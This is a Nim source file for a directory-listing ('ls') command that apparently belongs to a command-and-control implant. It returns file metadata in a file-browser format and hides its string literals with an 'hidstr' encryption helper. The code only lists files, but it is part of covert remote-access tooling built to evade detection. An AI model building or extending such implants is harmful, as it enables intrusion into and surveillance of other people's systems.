import std/[os, json, strutils, times]
import core/types, core/utils
import commands/registry
import crypto/strenc

proc lsExecute(taskId: string, params: JsonNode, state: AgentState,
               send: SendMsg): TaskResult =
  var path = params{"path"}.getStr(".")
  if path.len == 0: path = "."
  let fullPath = if isAbsolute(path): path else: state.cwd / path

  try:
    let dirInfo = getFileInfo(fullPath)
    let files   = newJArray()

    for kind, entry in walkDir(fullPath):
      let info   = getFileInfo(entry)
      let isFile = kind in {pcFile, pcLinkToFile}
      var perms: string
      when not defined(windows):
        let m = info.permissions
        perms = (if fpUserRead    in m: "r" else: "-") &
                (if fpUserWrite   in m: "w" else: "-") &
                (if fpUserExec    in m: "x" else: "-") &
                (if fpGroupRead   in m: "r" else: "-") &
                (if fpGroupWrite  in m: "w" else: "-") &
                (if fpGroupExec   in m: "x" else: "-") &
                (if fpOthersRead  in m: "r" else: "-") &
                (if fpOthersWrite in m: "w" else: "-") &
                (if fpOthersExec  in m: "x" else: "-")
      else:
        perms = if isFile: "rw-r--r--" else: "rwxr-xr-x"

      var fileObj = newJObject()
      fileObj[hidstr("is_file")]     = %isFile
      fileObj["permissions"]          = %*{"permissions": perms}
      fileObj["name"]                 = %lastPathPart(entry)
      fileObj[hidstr("access_time")] = %info.lastAccessTime.toUnix()
      fileObj["modify_time"]          = %info.lastWriteTime.toUnix()
      fileObj["size"]                 = %(if isFile: info.size else: 0)
      files.add(fileObj)

    var fileBrowser = newJObject()
    fileBrowser["host"]                = %getHostname()
    fileBrowser[hidstr("is_file")]     = %false
    fileBrowser["permissions"]         = newJObject()
    fileBrowser["name"]                = %lastPathPart(fullPath)
    fileBrowser["parent_path"]         = %parentDir(fullPath)
    fileBrowser["success"]             = %true
    fileBrowser[hidstr("access_time")] = %dirInfo.lastAccessTime.toUnix()
    fileBrowser["modify_time"]         = %dirInfo.lastWriteTime.toUnix()
    fileBrowser["size"]                = %0
    fileBrowser["update_deleted"]      = %true
    fileBrowser["files"]               = files

    var fbWrapper = newJObject()
    fbWrapper[hidstr("file_browser")] = fileBrowser
    return TaskResult(
      output:      $fbWrapper,
      status:      "success",
      completed:   true,
      extraFields: fbWrapper,
    )
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initLs*() =
  register(hidstr("ls"), lsExecute)
